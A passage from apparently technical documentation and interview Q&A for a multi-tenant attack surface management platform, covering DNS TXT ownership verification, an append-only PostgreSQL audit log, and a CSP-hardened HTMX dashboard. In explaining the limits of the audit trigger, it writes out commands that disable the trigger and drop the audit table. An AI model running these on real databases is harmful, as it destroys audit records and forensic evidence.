  Standard DNS (RFC 1034 / 1035) is an unauthenticated, cleartext protocol over UDP port 53. Unless DNSSEC (RFC 4033) is deployed, validated, and enforced along the entire resolution chain, DNS responses can theoretically be spoofed via cache poisoning, BGP route hijacking, or local network manipulation. Furthermore, the TXT record itself is a plain string token—it does not involve cryptographic signatures, asymmetric public/private key challenges, or zero-knowledge proofs.
- **Proof of DNS Control:**
  What the TXT record proves is administrative control over the domain's authoritative DNS zone file at the registrar or DNS hosting provider (Route53, Cloudflare, Azure DNS). Because only authorized zone administrators have write permissions to add or modify records under `_asm-verify.<domain>`, publishing the server-generated random token demonstrates that the user controls the domain's DNS administration.
- **Security Guarantees Provided:**
  1. *Anti-Spoofing via High Entropy:* Generating a 32-byte cryptographically secure random token (`secrets.token_urlsafe(32)`) yields 256 bits of entropy, making it computationally infeasible for an attacker to guess a valid token.
  2. *Tenant Boundary Binding:* Each tenant receives a distinct token for the same domain, preventing an attacker from piggybacking on another tenant's DNS records.
  3. *Revocability:* The domain owner can instantly revoke scanning permission by deleting the TXT record from their DNS provider.

---

### Question 2: In the DNS protocol (RFC 1035), why can a single TXT record contain multiple character strings, and how must a verification parser handle them?
**Answer:**
- **The 255-Byte String Limitation:**
  In RFC 1035 Section 3.3.14, the RDATA section of a TXT record is defined as one or more `<character-string>` elements, where each individual `<character-string>` begins with a 1-byte length octet ($0-255$). Consequently, a single string element cannot exceed 255 octets.
- **Chunking in DNS Zone Files:**
  When a TXT value exceeds 255 bytes (or when DNS administrator tooling formats records into lines), DNS servers and zone files split the value across multiple quoted strings within a single resource record:
  `"asm-verify=" "k8P2qZ_v9LmNx0R4tYw1sA2bC3dE4fG5hI6jK7lM8nO"`
- **Required Parser Behavior:**
  According to RFC 4408 and RFC 7208 (SPF), multiple character strings in a single TXT record must be concatenated end-to-end without adding whitespace or delimiter characters before evaluation.
  In Python with `dnspython`:
  ```python
  # rdata.strings is a tuple of bytes, e.g. (b"asm-verify=", b"k8P2qZ...")
  combined_text = "".join(chunk.decode("utf-8", errors="replace") for chunk in rdata.strings)
  ```
  Failing to join strings causes false-negative verification failures when DNS providers chunk records.

---

### Question 3: In an automated background re-verification engine, explain why distinguishing between "Definite Absence" and "Transient Unknown" is critical. What failure modes occur if this distinction is ignored?
**Answer:**
- **The Semantic Distinction:**
  - *Definite Absence (`ABSENT`):* An authoritative nameserver responded successfully, but returned `NXDOMAIN` (domain deleted/non-existent) or returned a successful answer section that contained no matching TXT record. This is a definitive negative assertion.
  - *Transient Unknown (`UNKNOWN`):* The query resulted in an I/O timeout, packet drop, `SERVFAIL` (nameserver DNSSEC validation failure or upstream resolver issue), or connection refusal.
- **The Failure Mode If Treated as Absence (Flapping / False Lapses):**
  If `UNKNOWN` is treated as a miss or triggers a lapse:
  - Transient network latency, temporary BGP routing glitches, or DNS provider DDoS attacks would instantly cause customer domains to lapse.
  - Active monitoring schedules would pause, and customers would receive false-alarm alert notifications during internet outages.
- **The Failure Mode If Treated as Match (Zombie Permissions):**
  If `UNKNOWN` is treated as verified:
  - A malicious actor could exploit DoS attacks against nameservers to maintain unauthorized scan permissions on expired domains.
- **The Resilient Solution:**
  1. `UNKNOWN` leaves verification state untouched and never increments `consecutive_misses`.
  2. Lapsing requires **2 consecutive definite misses** (`ABSENT`), with a 1-hour fast retry after the first miss to absorb transient zone update delays.

---

### Question 4: How does per-tenant token scoping prevent "Cross-Tenant Verification Hijacking" when two competing organizations monitor the same apex domain?
**Answer:**
- **The Threat Vector (Global / Shared Token Hijacking):**
  Suppose the platform used a deterministic or domain-wide token (such as a hash of the domain name, or a single token shared across all accounts).
  If Organization A (the legitimate owner of `target.com`) places the TXT record in their DNS zone to scan their domain:
  Organization B (a competitor or hostile actor) could add `target.com` to their own account. If the platform checked only whether the domain's TXT record matched the domain-level token, Organization B would be granted full active scanning rights against Organization A's infrastructure.
- **The Defense (Per-Tenant Independent Tokens):**
  1. Every `(org_id, domain_id)` tuple generates its own cryptographically random 32-byte URL-safe token.
  2. Organization A's token: `asm-verify=token_AAA`
  3. Organization B's token: `asm-verify=token_BBB`
  4. For Organization B to verify `target.com`, they must persuade the domain administrator to publish `token_BBB`.
  5. Organization A publishing `token_AAA` exclusively verifies Organization A. Even if both organizations add `target.com`, only the organization whose specific token is published in the zone file can execute active scans.

---

### Question 5: Why must active security scanners enforce ownership verification checks both at job submission (`enqueue_scan`) and immediately before every active pipeline stage?
**Answer:**
- **Defense in Depth Across Time Horizons:**
  1. *Submission Gate (`enqueue_scan`):*
     Blocks unverified jobs from entering the queue. This prevents queue bloat, avoids database resource consumption, and provides immediate HTTP 422 feedback to users attempting unauthorized scans.
  2. *Mid-Scan Execution Gate (Pre-Stage Enforcement):*
     Scanning pipelines are long-running distributed workflows. Between the moment a scan is enqueued and when the worker reaches active stages (`probe`, `portscan`, `inspect`):
     - Hours may elapse if the worker queue is congested.
     - A domain owner may have realized an unauthorized employee created an account and revoked the TXT record or operator override.
     - The background re-verification worker may have marked the domain `lapsed`.
     - An operator may have revoked verification via `asm admin revoke-verification`.
  3. *Eliminating Time-of-Check to Time-of-Use (TOCTOU) Exploitation:*
     If the worker trusted only the initial status check performed at enqueue time, an attacker could verify a domain temporarily, enqueue dozens of intensive scans, immediately delete the DNS record, and let the worker continue active probing against an unverified target. Checking domain verification status immediately before executing `discover`, `probe`, `portscan`, and `inspect` guarantees that authorization is currently active throughout the scan lifecycle.












---

# Part 9: v3.3 — Append-Only Audit Logging & Event Tracking

## 1. Plain-English Architecture & Design Walkthrough

### Why Audit Logging in Multi-Tenant Security SaaS?
Security teams and auditors expect a reliable record of security-sensitive actions. When an active scan is launched against public infrastructure, when user roles or organization memberships change, or when domain ownership is verified, overridden, or revoked, security teams must be able to reconstruct an authoritative timeline: who performed the action, under what authority, when it occurred, and what changed.

In a multi-tenant platform, audit logging introduces three strict architectural constraints:
1. **Tenant Isolation:** Audit events must be scoped by `org_id`. An organization's administrators must only ever observe their own tenant's audit trail.
2. **Immutability Against the Application:** Application code, API endpoints, and potential SQL injection vulnerabilities must never be capable of modifying or deleting historical audit records.
3. **Atomic Recording:** An audit record must never be committed if the underlying business action fails, nor should a business action succeed without its corresponding audit record.

---

### Database-Enforced Immutability: The Append-Only Trigger
Rather than relying on application-level conventions (e.g. omitting update/delete methods in ORM models), immutability is enforced directly by PostgreSQL via a database trigger:
- **Table:** `audit_events` (created in migration `0009_audit_events`).
- **Trigger Function:**
  ```sql
  CREATE OR REPLACE FUNCTION prevent_audit_events_mutation()
  RETURNS TRIGGER AS $$
  BEGIN
      RAISE EXCEPTION 'audit_events is append-only';
  END;
  $$ LANGUAGE plpgsql;
  ```
- **Trigger Definition:**
  ```sql
  CREATE TRIGGER trg_audit_events_append_only
  BEFORE UPDATE OR DELETE ON audit_events
  FOR EACH ROW
  EXECUTE FUNCTION prevent_audit_events_mutation();
  ```
- **The "Append-Only Against the Application" Invariant:**
  We explicitly document this guarantee as: *"append-only against the application; the table owner can disable the trigger"*.
  We never use the marketing phrase "tamper-proof". Anyone with database superuser or table ownership privileges can execute `ALTER TABLE audit_events DISABLE TRIGGER trg_audit_events_append_only;` or drop the table directly. Honesty about trust boundaries is foundational to sound security architecture.

---

### The Unified Helper: `record_event()` in `src/asm/audit.py`
All 15 audit events across the platform are created through a single authoritative function:
```python
def record_event(
    db: Session,
    *,
    org_id: int,
    actor_type: str,
    action: str,
    target_type: str,
    target_id: str,
    actor_user_id: uuid.UUID | None = None,
    metadata: dict[str, Any] | None = None,
) -> AuditEvent:
```

#### The "No Flush, No Commit" Invariant
`record_event()` constructs an `AuditEvent` model instance and calls `db.add(event)`.
It intentionally **never** calls `db.flush()` or `db.commit()`.
- **Atomic Fate with Business Transactions:** The audit event lives inside the caller's active database transaction. If the caller's operation completes successfully, `db.commit()` commits the state change and the audit event together. If the caller encounters an exception or rolls back, the audit event is rolled back with it.
- **Elimination of Ghost Events:** If `record_event()` committed independently, an error occurring later in the API route (such as a database constraint violation or network failure) would leave a ghost audit event recording an action that never actually took effect.

---

### Metadata Sanitization & Defensive Invariants
To prevent audit logs from becoming vectors for data exfiltration, storage exhaustion, or PII leakage, `record_event()` enforces strict defensive controls:

1. **Per-Action Key and Type Allowlists (`ACTION_METADATA_SCHEMAS`):**
   Every action has an immutable schema defining permitted metadata keys and their required Python types (e.g. `{"scan_type": str, "source": str}` for `scan.queued`). Any unexpected key or mismatched data type raises a `ValueError`.
2. **Prohibited Sensitive Data:**
   Tokens, JWTs, user passwords, user email addresses, and IP addresses are strictly forbidden from metadata schemas.
3. **Truncation & Redaction for Free-Text Inputs:**
   Certain actions accept free-text inputs provided by users or operators (`name` in `org.created`, `reason` in `verification.operator_verified` and `verification.revoked`).
   - The value is truncated to **500 characters** before processing.
   - Any patterns matching email addresses or IPv4/IPv6 addresses are masked with `[redacted]` via regular expressions.
4. **Byte Size Cap:**
   The serialized JSON metadata payload is checked to ensure it does not exceed **2048 bytes**, preventing denial-of-service via database storage bloat.

---

### The 15 Standardized Audit Actions
The system tracks 15 discrete, security-relevant actions across 5 domains:

| Action | Actor | When Recorded | Target Type |
|---|---|---|---|
| `org.created` | user / system | Organization is created | `organization` |
| `membership.added` | user | User invited or added to organization | `membership` |
| `membership.role_changed` | user | Member role updated (e.g. viewer to admin) | `membership` |
| `membership.removed` | user | Member removed from organization | `membership` |
| `domain.created` | user | Domain added to organization inventory | `domain` |
| `domain.deleted` | user | Domain deleted from organization | `domain` |
| `domain.alerts_changed` | user | Domain alerting enabled, disabled, or recipients changed | `domain` |
| `domain.moved` | operator | Domain moved between organizations (2 events: source & target) | `domain` |
| `verification.token_generated` | user / system | New verification token generated upon domain creation | `domain` |
| `verification.checked` | user | Verification check requested via API | `domain` |
| `verification.rotated` | user | Domain verification token rotated | `domain` |
| `verification.operator_verified` | operator | Operator break-glass override applied | `domain` |
| `verification.revoked` | operator | Operator override revoked | `domain` |
| `verification.lapsed` | system | Background worker marks domain lapsed after 2 misses or expiration | `domain` |
| `scan.queued` | user / system | Scan enqueued via API or scheduler | `scan_run` |

**What is intentionally NOT recorded:**
- Denied requests (e.g. HTTP 401 or 403 authorization failures). These are captured in edge/WAF logs, not the tenant business audit trail.
- Client IP addresses and User-Agent headers (to avoid PII and GDPR/privacy storage overhead).
- User authentication/login events (managed entirely by Supabase Auth).

---

### Audit Log Querying & Keyset Cursor Pagination
The audit log is accessible via `GET /orgs/{org_id}/audit-events`:
- **RBAC Protection:** Requires minimum role `admin` or `owner`. Non-members receive `404 Not Found`; `viewer` members receive `403 Forbidden`.
- **Filtering:** Optional query parameters `domain_id` (bigint) and `action` (string).
- **Keyset Cursor Pagination:**
  - Standard pagination with `OFFSET` degrades to $O(N)$ query performance as table size grows.
  - Keyset cursor pagination uses the primary key: `WHERE org_id = :org_id AND id < :before_id ORDER BY id DESC LIMIT :limit`.
  - Capped at `limit <= 100` (default 50).
  - Backed by the composite B-tree index `ix_audit_events_org_id_id` on `(org_id, id)`, queries execute in $O(\log N)$ time regardless of pagination depth.

---

## 2. Five Audit Logging & Event Tracking Interview Questions & Answers

### Question 1: Why is the audit log described as "append-only against the application; the table owner can disable the trigger" rather than "tamper-proof"? What is the security difference between application-level immutability and true hardware/cryptographic immutability?
**Answer:**
- **Honest Trust Boundaries vs. Marketing Claims:**
  In cybersecurity architecture, labeling an RDBMS table "tamper-proof" is inaccurate and misleading. Any user or process possessing database superuser privileges or table ownership can execute:
  ```sql
  ALTER TABLE audit_events DISABLE TRIGGER trg_audit_events_append_only;
  ```
  or directly run `DROP TABLE audit_events;`.
- **Application-Level Immutability ("Append-Only Against the Application"):**
  What the PostgreSQL trigger actually guarantees is that the **application runtime**, the web API, ORM operations, worker processes, and any SQL injection vulnerabilities executing within the application's database role cannot update or delete audit events. Even if an attacker gains full remote code execution inside the web application container, their SQL queries execute under the application's database credentials, where the trigger intercepts and blocks all `UPDATE` and `DELETE` attempts.
- **True Immutability:**
  True immutability requires:
  1. *WORM Storage (Write Once, Read Many):* Cloud object storage with Object Lock in Compliance Mode (e.g. AWS S3 Object Lock, GCP Bucket Retention), where not even the root account can delete objects before the retention period expires.
  2. *Cryptographic Hash-Chains:* Merkle-tree based public ledgers (such as Certificate Transparency logs or Sigstore Rekor) where every new event contains the cryptographic hash of the previous event and is signed by external witnesses.
  Documenting the design honestly defines clear operational boundaries and avoids deceptive compliance assurances.

---

### Question 2: Why must the audit helper `record_event` intentionally avoid calling `db.commit()` or `db.flush()`? What catastrophic failure modes occur if an audit function commits independently?
**Answer:**
- **The Principle of Transaction Atomicity (All-or-Nothing):**
  An audit log is an accurate record of events that *actually occurred* in the system. The creation of an audit record must therefore share the exact ACID transaction boundary of the business operation it describes.
- **Failure Mode 1: Ghost Audit Records (False Positives):**
  If `record_event()` called `db.commit()` immediately upon creating the audit row:
  1. The API route calls `record_event(..., action="domain.created")`. The audit row commits to disk.
  2. The next line of code attempts to commit the domain, but encounters a database unique constraint collision or foreign key failure.
  3. The route raises an HTTP 409 exception and rolls back the domain insert.
  4. *Result:* The audit log now contains a permanent, un-deletable record asserting that a domain was created, when in reality no domain was ever created. In a security incident investigation, ghost records corrupt the forensic timeline.
- **Failure Mode 2: Premature Locks and Flushes:**
  Calling `db.flush()` sends SQL queries to the database server before the business logic is complete, obtaining locks on sequences and rows prematurely and increasing database lock contention.
- **The Correct Architecture:**
  `record_event()` only calls `db.add(event)`. If the caller's outer transaction succeeds and commits, both the entity change and the audit event persist together. If an unhandled exception occurs, both roll back cleanly.

---

### Question 3: Why are free-text metadata fields (such as organization names or operator override reasons) truncated to 500 characters and masked as `[redacted]` rather than raising validation errors if emails or IPs are detected?
**Answer:**
- **Availability of Primary Business Operations:**
  Audit logging is a secondary, cross-cutting telemetry concern. A failure in audit formatting must never block or abort a critical business or security operation.
- **The Hazard of Fail-Closed Pattern Rejection:**
  If the audit system raised a validation exception whenever an input matched an email or IP pattern:
  1. *Operator Break-Glass Lockout:* An operator executing an emergency override via `asm admin verify-domain --reason "Bypassing DNS check for internal proxy 192.168.1.10"` would have their command aborted because the reason contained an IP address.
  2. *Worker Lapsing Failure:* If a background verification worker encountered a DNS error containing an IP address and passed it to an audit metadata field, an exception would crash the worker and prevent the domain from transitioning to `lapsed`, leaving unauthorized scans running indefinitely.
  3. *User Registration Friction:* A customer creating an organization named `support@company.com` would receive an unexpected 500 or 422 error.
- **Sanitization via Masking and Truncation:**
  By truncating strings to 500 characters and replacing email/IP patterns with `[redacted]`:
  1. The business transaction always completes successfully.
  2. Sensitive personal data (PII) and network topologies are prevented from leaking into audit logs.
  3. Denial-of-service attacks attempting to bloat JSONB storage with multi-megabyte strings are neutralized upfront.

---

### Question 4: Explain why keyset cursor pagination (`before_id` / `id < before_id`) is superior to offset pagination (`OFFSET n LIMIT m`) for high-volume, append-only event streams.
**Answer:**
- **1. $O(\log N)$ Index Seeks vs. $O(N)$ Sequential Scans:**
  - *Offset Pagination:* In `SELECT * FROM audit_events WHERE org_id = 1 ORDER BY id DESC LIMIT 50 OFFSET 100000;`, PostgreSQL must traverse the B-tree index to locate the start, read 100,000 index tuples, discard them all, and then return the next 50 rows. As the table grows into millions of records, deep pagination causes high disk I/O, CPU spikes, and query timeouts.
  - *Keyset Pagination:* In `SELECT * FROM audit_events WHERE org_id = 1 AND id < 100050 ORDER BY id DESC LIMIT 50;`, the database uses the composite index `ix_audit_events_org_id_id` on `(org_id, id)` to perform a direct B-tree search for `(1, 100050)`. It immediately reads the subsequent 50 rows. The query executes in constant $O(\log N)$ time regardless of whether the user is on page 1 or page 10,000.
- **2. Elimination of the "Pagination Shift / Missing Rows" Phenomenon:**
  In an active system, new audit events are continuously inserted at the top of the table.
  - If a user reads page 1 (`OFFSET 0 LIMIT 50`) and 10 new events are inserted while they inspect the results, requesting page 2 (`OFFSET 50 LIMIT 50`) shifts the window: the last 10 rows from page 1 are pushed into page 2 and displayed a second time.
  - Conversely, in systems where rows are deleted, records are skipped entirely.
  - With keyset cursor pagination, `before_id` anchors the query to a deterministic point in time. The next page consists strictly of records created before that specific ID, providing a consistent, non-shifting view of history.

---

### Question 5: When transferring a domain between organizations (`asm admin move-domain`), why does the system record two separate audit events (`domain.moved` under the source org and `domain.moved` under the target org) in the same transaction?
**Answer:**
- **Strict Multi-Tenant Scoping of Audit Queries:**
  In multi-tenant architecture, tenant audit log queries are strictly filtered by organization:
  ```sql
  SELECT * FROM audit_events WHERE org_id = :org_id;
  ```
  Tenant administrators have no visibility into other organizations' audit records.
- **The Blind Spot of a Single Event:**
  - If `domain.moved` was recorded only under the source organization (`org_id = source_org_id`): The target organization's administrators would see a new domain appear in their inventory with no audit trail explaining when it arrived, who transferred it, or where it came from.
  - If `domain.moved` was recorded only under the target organization (`org_id = target_org_id`): The source organization's administrators would see an asset vanish from their attack surface inventory with zero explanatory log entries, creating confusion during forensic audits.
- **The Dual-Event Architecture:**
  By recording two distinct audit events in the same atomic database transaction:
  1. *Source Organization Event:*
     - `org_id`: `source_org_id`
     - `action`: `domain.moved`
     - `actor_type`: `operator`
     - `target_type`: `domain`
     - `target_id`: str(domain_id)
     - `metadata`: `{"to_org_id": target_org_id}`
  2. *Target Organization Event:*
     - `org_id`: `target_org_id`
     - `action`: `domain.moved`
     - `actor_type`: `operator`
     - `target_type`: `domain`
     - `target_id`: str(domain_id)
     - `metadata`: `{"from_org_id": source_org_id}`
  Both organizations receive a record of the asset movement without breaching tenant data isolation.

---

# Part 9: Phase v3.4a — Dashboard Shell, Organization Navigation & Domain Verification UI

## 1. Plain-English Code Walkthrough

### `src/asm/api/routes_ui.py`
- **What it is:** Read-only, server-rendered HTML endpoints for the application shell and dynamic HTMX fragments.
- **Why it exists:** Provides the web presentation layer for the ASM dashboard without requiring a Node.js runtime, npm build pipeline, or heavy Single Page Application (SPA) framework.
- **Key Endpoints & Functions:**
  - `GET /app`: Public application container rendering `templates/app.html`. Injects public Supabase configuration (`SUPABASE_URL` and `SUPABASE_PUBLISHABLE_KEY`) via HTML `data-*` attributes on `<body>`. Contains no private tenant data and requires no initial server authentication.
  - `GET /ui/empty-org`: Read-only partial rendering `templates/partials/empty_org.html` for authenticated users with zero organizations. Requires a valid JWT via `get_current_user`.
  - `GET /ui/orgs/{org_id}/domains`: Read-only partial rendering `templates/partials/domains_list.html`. Protected by the existing tenant choke point `require_org_role("viewer")`. Passes `user_role` into the template so that the "Add domain" form is only rendered for `admin` and `owner` roles.
  - `GET /ui/orgs/{org_id}/domains/{domain_id}`: Read-only partial rendering `templates/partials/domain_detail.html`. Protected by both `require_org_role("viewer")` and `get_domain_for_org(db, org_id, domain_id)`. Renders DNS TXT verification proof instructions, copy buttons, and action buttons ("Check now", "Rotate token") for `admin`/`owner` roles.
- **Anti-Enumeration & Cache Controls:**
  - Unauthenticated requests to `/ui/*` endpoints return HTTP 401 Unauthorized.
  - Non-members attempting to access foreign organizations or domains receive HTTP 404 Not Found (via `require_org_role` and `get_domain_for_org`), strictly preventing tenant existence enumeration.
  - All `/ui/*` endpoints emit `Cache-Control: no-store` to prevent caching sensitive tenant HTML in browser history or shared proxy caches.

### `src/asm/templates/`
- **What it is:** Semantic HTML5 templates rendered with Jinja2 (`autoescape=True`).
- **Templates Structure:**
  - `base.html`: The root HTML scaffold. Links self-hosted IBM Plex Sans/Mono fonts and `app.css`. Includes `<meta name="htmx-config" content='{"includeIndicatorStyles": false, "allowEval": false, "allowScriptTags": false}'>` in `<head>` to block HTMX from injecting inline `<style>` tags that violate CSP. Defers loading vendored `htmx.min.js`, `supabase.min.js`, and `app.js`. Zero inline scripts or styles.
  - `app.html`: The application container extending `base.html`. Renders the public sign-in card (`#auth-section`), top navigation bar with organization switcher and sign-out button, and empty `#main-content-area` target for HTMX fragment injection.
  - `partials/empty_org.html`: Form enabling first-time users to create their first organization via `POST /orgs`.
  - `partials/domains_list.html`: Table of monitored domains displaying status badges ("Status: pending", "Status: verified", "Status: lapsed") in sentence case, fully readable without relying on color alone.
  - `partials/domain_detail.html`: Detailed verification inspection view. Contains the live outcome target `<div id="verification-check-result" aria-live="polite"></div>` without hiding classes, allowing instant accessibility announcements and persistent UI rendering across HTMX settle cycles.

### `src/asm/static/js/app.js`
- **What it is:** Vanilla client-side script managing Supabase authentication, HTMX request headers, and UI state synchronization.
- **Key Mechanics:**
  - **Supabase Authentication:** Reads configuration from document body `data-*` attributes and initializes `supabase.createClient()` with `persistSession: true` and `storage: window.sessionStorage`.
  - **Memory Token Storage:** Maintains `currentAccessToken` in module memory. Synchronizes token state via `supabaseClient.auth.onAuthStateChange()`.
  - **Token Refresh Separation:** Distinguishes between token refresh and sign-in. On `TOKEN_REFRESHED`, it updates `currentAccessToken` and returns immediately without resetting the UI. Guarded by `isAuthenticated` so `onUserAuthenticated()` executes exactly once per sign-in.
  - **Synchronous Header Injection:** Listens for `htmx:configRequest` and attaches `Authorization: Bearer <currentAccessToken>` synchronously to every outgoing HTMX request.
  - **Automated 401 Recovery:** Listens for `htmx:responseError`. Upon encountering an HTTP 401, attempts a single `refreshSession()` call and retries the failed HTMX request. If the refresh fails, it signs the user out cleanly and resets UI state.
  - **Zero Duplicated Writes:** Write operations intercept DOM submissions and dispatch asynchronous `fetch()` calls to existing JSON REST endpoints (`POST /orgs`, `POST /orgs/{org_id}/domains`, etc.). Once the write succeeds, `htmx.ajax('GET', ...)` swaps the updated HTML fragment.
  - **Strict XSS Defense:** Zero occurrences of the word `innerHTML`. All dynamic check results, error messages, and validation details are rendered using safe DOM nodes and `textContent` only.

### `src/asm/static/` (Vendored Assets & Fonts)
- **`vendor/VENDOR.md`:** Records pinned versions, official upstream release URLs, cryptographic SHA-256 hashes, and security advisory audit dates for HTMX 2.0.11 and Supabase JS 2.117.2.
- **`fonts/`:** Self-hosted WOFF2 font files for IBM Plex Sans (Regular, SemiBold) and IBM Plex Mono (Regular), accompanied by the SIL Open Font License 1.1 (`OFL.txt`). Eliminates external font CDN requests and guarantees CSP compatibility.
- **`css/app.css`:** Scoped CSS variables based on a 6-color palette derived from operational reconnaissance: Abyssal Ink (`#141c2b`), Sea Glass (`#f4f6f8`), Signal White (`#ffffff`), Cobalt Beacon (`#1d5bbf`), Tungsten Warning (`#c25700`), and Active Veridian (`#0d7d55`). Text contrast ratios exceed WCAG AA 4.5:1.

---

## 2. Five v3.4a Interview Questions & Answers

### Question 1: What is Content Security Policy (CSP), how is it enforced in v3.4a, and why is `default-src 'self'` with zero inline scripts or styles critical for server-rendered web applications?
**Answer:**
- **What CSP Is:**
  Content Security Policy (CSP) is an HTTP response header that restricts the resources (scripts, styles, fonts, images, network connections) the browser is permitted to load and execute for a given origin. It serves as the primary defense-in-depth barrier against Cross-Site Scripting (XSS), data exfiltration, and clickjacking.
- **Configuration in v3.4a:**
  The FastAPI security headers middleware applies the following policy on `/app`, `/ui/*`, and `/static/*`:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; font-src 'self'; img-src 'self' data:; connect-src 'self' https://<SUPABASE_PROJECT_ID>.supabase.co; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
  ```
- **Why `default-src 'self'` and Zero Inline Directives Are Critical:**
  1. *Neutralizing Injected Payloads:* By default, browsers execute `<script>...</script>` tags or `javascript:...` URLs embedded in HTML. Under a strict CSP without `'unsafe-inline'`, any injected `<script>` tag or attribute event handler (`onclick=...`) is blocked from executing by the browser engine.
  2. *Blocking Unauthorized Network Exfiltration:* `connect-src 'self' <SUPABASE_URL>` restricts network dispatch (`fetch`, `XMLHttpRequest`, `WebSocket`) solely to the application origin and the designated Supabase authentication endpoint. Even if an attacker finds an unexpected script execution vector, they cannot exfiltrate stolen tokens or customer data to an external command-and-control server.
  3. *Eliminating Clickjacking and Framing:* `frame-ancestors 'none'` prevents the application from being embedded in an `<iframe>` on any third-party domain, defeating UI redressing attacks.
  4. *HTMX Inline Style Defense:* HTMX by default injects an inline `<style>` element for progress indicators. Because `'unsafe-inline'` is omitted, CSP blocks this injected style. Configuring `<meta name="htmx-config" content='{"includeIndicatorStyles": false, ...}'>` ensures compliance without weakening CSP directives.

---

### Question 2: Why did the v3.4a dashboard adopt Bearer token authentication in the `Authorization` header rather than session cookies, what security trade-off does this make between CSRF and XSS, and how is that trade-off mitigated?
**Answer:**
- **The Choice of Bearer Headers:**
  In v3.4a, every HTMX and fetch request carries `Authorization: Bearer <access_token>`, which is validated on the backend by the existing `get_current_user` dependency.
- **CSRF Immunity vs. XSS Susceptibility Trade-Off:**
  - *Cookie-Based Auth (Vulnerable to CSRF by Default):* Browsers automatically attach ambient session cookies to all requests targeting a domain, even requests initiated cross-origin by malicious third-party sites (e.g. via image tags, cross-origin forms, or malicious fetch). Protecting cookies requires SameSite flags, custom headers, and anti-CSRF synchronizer tokens.
  - *Bearer Token Auth (Immune to CSRF):* Browsers never automatically attach custom `Authorization: Bearer <token>` headers to cross-origin requests. An attacker on `evil.com` cannot force a user's browser to submit authenticated mutations to `/orgs` or `/domains`. Cross-Site Request Forgery is structurally impossible.
  - *The Trade-Off (XSS Exposure):* Unlike `HttpOnly` cookies, which JavaScript cannot read, Bearer tokens must be accessible to client-side scripts to inject them into headers. If an attacker achieves arbitrary JavaScript execution (XSS), they can read the token from application memory or storage.
- **Multi-Layered Mitigation of XSS Risk:**
  To make this trade-off defensible, XSS is defended with defense-in-depth:
  1. *Zero Inline Scripts or Styles:* Enforced by CSP without `'unsafe-inline'`.
  2. *Automatic Template Escaping:* Jinja2 runs with autoescape enabled; untrusted domain or organization names are HTML-entity encoded (`<` becomes `&lt;`, `"` becomes `&#34;`).
  3. *DOM Mutation Hardening:* Client code in `app.js` renders all dynamic content (check outcomes, error messages) using `textContent` only; `innerHTML` is banned from the codebase.
  4. *Ephemeral Session Storage:* Tokens reside in module memory and are persisted only to `sessionStorage` (which expires when the tab closes and is never shared across browser windows or stored permanently on disk like `localStorage`).

---

### Question 3: Describe the "HTMX Settle" class re-application bug observed in headless Chrome testing. What is HTMX's settle lifecycle, and why was the fix to remove `class="hidden"` from the response template?
**Answer:**
- **The Observed Bug:**
  When a user clicked "Check now" on the domain verification view, `app.js` executed `POST .../verification/check`, received the JSON response, updated the DOM container `#verification-check-result`, and removed the `hidden` class (`classList.remove('hidden')`). However, after ~20ms, the result container reverted to `class="hidden"`, rendering the verification result invisible to the user.
- **Root Cause: The HTMX Settle Phase:**
  HTMX processes DOM updates in distinct lifecycle steps:
  1. *AJAX Fetch:* Retrieves the HTML fragment from the server.
  2. *Swap:* Replaces the target DOM element with the incoming HTML partial.
  3. *Settle Phase (~20ms delay):* After the swap, HTMX pauses briefly before "settling" the DOM. During settling, HTMX re-synchronizes element attributes from the swapped fragment to apply CSS transition classes.
  Because the server template `templates/partials/domain_detail.html` originally defined `<div id="verification-check-result" class="hidden"></div>`, the incoming fragment contained `class="hidden"`. When `loadDomainDetail()` refreshed the DOM, HTMX swapped the fragment, and then its settle phase re-applied `class="hidden"` from the partial template, clobbering the dynamic `.classList.remove('hidden')` mutation executed in JavaScript!
- **The Fix:**
  1. *Template Redesign:* Removed `class="hidden"` from the partial template entirely and replaced it with accessibility semantics: `<div id="verification-check-result" aria-live="polite"></div>`.
  2. *Execution Sequence:* In `app.js`, domain detail is refreshed first via `loadDomainDetail(orgId, domainId)`. Once the HTMX swap and settle promise resolves (`.then()`), the JavaScript renders the check outcome into the freshly swapped `#verification-check-result` container.
  3. *Clean Accessibility:* When empty, the container takes zero visual space. When populated, screen readers announce the live result via `aria-live="polite"` and the alert box remains visible indefinitely.

---

### Question 4: Why does the dashboard send write operations directly to existing JSON REST endpoints (`POST /orgs`, `POST /orgs/{id}/domains`, etc.) rather than introducing dedicated HTML-returning POST routes?
**Answer:**
- **1. Single Source of Truth for Business & Security Logic:**
  All domain validation, RFC compliance checks, organization limits, DNS cooldowns, and cryptographic token generation live in the existing API route handlers and services. Adding dedicated HTML form-handling POST endpoints would duplicate this logic or create parallel validation code paths that inevitably drift over time.
- **2. Unbroken Audit Trail & Transactional Integrity:**
  Phase v3.3 established an append-only audit log recording 15 structured actions. The existing JSON endpoints (`POST /orgs`, `POST .../verification/check`, etc.) already contain tested, transactionally atomic audit logging hooks (`record_event`). Reusing these endpoints guarantees that web actions generate the identical audit events as direct API or CLI actions.
- **3. Unified Rate Limiting & Row Locking:**
  Verification checks require database row locks (`SELECT ... FOR UPDATE`) to enforce the 30-second verification cooldown across concurrent requests. Route handlers already encapsulate this lock-and-verify logic.
- **4. Architectural Simplicity:**
  The server-rendered UI endpoints (`/ui/*`) remain purely read-only (`GET`). Write operations in `app.js` dispatch standard `fetch()` calls with JSON payloads, handle typed API responses, and then instruct HTMX to refresh the corresponding read-only HTML fragment (`htmx.ajax('GET', ...)`). The frontend is a consumer of the exact same API available to automated CLI tools.

---

### Question 5: Why are third-party JavaScript libraries (HTMX and Supabase JS) vendored locally within the repository instead of loading them from public CDNs, and why are their SHA-256 hashes recorded in `VENDOR.md`?
**Answer:**
- **1. Elimination of Third-Party Supply-Chain Risk:**
  Loading scripts from external CDNs (`<script src="https://cdn.jsdelivr.net/...">`) creates a direct supply-chain dependency. If the CDN provider suffers an account takeover, DNS hijacking, or infrastructure compromise, attackers can serve malicious JavaScript directly into the application, bypassing authentication and capturing customer data. Vendoring code into the repository ensures that all executed code is version-controlled and inspected.
- **2. Strict Content Security Policy (No External Script Origins):**
  Using a third-party CDN requires adding its origin to `script-src` in the CSP (`script-src 'self' https://unpkg.com`). This increases attack surface: an attacker who discovers an open redirect or hosting exploit on that CDN can load arbitrary scripts. Keeping dependencies under `/static/vendor/` permits a minimal `script-src 'self'` policy.
- **3. Deterministic Builds & Air-Gapped / Offline Reliability:**
